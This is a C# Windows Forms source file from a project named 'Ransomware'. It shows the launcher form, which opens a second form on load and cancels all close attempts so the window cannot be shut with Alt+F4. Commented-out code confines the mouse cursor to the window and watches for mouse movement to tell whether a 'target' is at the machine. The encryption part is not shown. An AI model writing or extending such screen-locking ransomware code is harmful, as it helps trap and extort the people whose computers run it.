using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Ransomware
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Form2 form2 = new Form2();
            /*
            this.Cursor = new Cursor(Cursor.Current.Handle);
            Cursor.Position = new Point(Cursor.Position.X - 1717, Cursor.Position.Y - 784);
            Cursor.Clip = new Rectangle(this.Location, this.Size);
            Thread.Sleep(500);
            */
            /*
                        targeting:
                        this.Cursor = new Cursor(Cursor.Current.Handle);
                        int posX = Cursor.Position.X;
                        int posY = Cursor.Position.Y;
                        Thread.Sleep(10000);

                        this.Cursor = new Cursor(Cursor.Current.Handle);
                        int posX2 = Cursor.Position.X;
                        int posY2 = Cursor.Position.Y;

                        if (posX2 == posX)
                        {
                            MessageBox.Show("Target is offline..");
                        }
                        else
                        {
                            goto targeting;
                        }
                        /*
                        DialogResult dialogResult = MessageBox.Show("Attention! This file is dangerous and can irreversibly damage your data, do you really want to run it? If not, just click \"no\"", "Warning - malicious program", MessageBoxButtons.YesNo);
                        if (dialogResult == DialogResult.Yes)
                        {
                            form2.Show();
                        }
                        else if (dialogResult == DialogResult.No)
                        {
                            Application.Exit();
                        }
                        */


            form2.Show();
            
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true; //Zablokuje vypnutí pomocí altf4
        }
    }
}
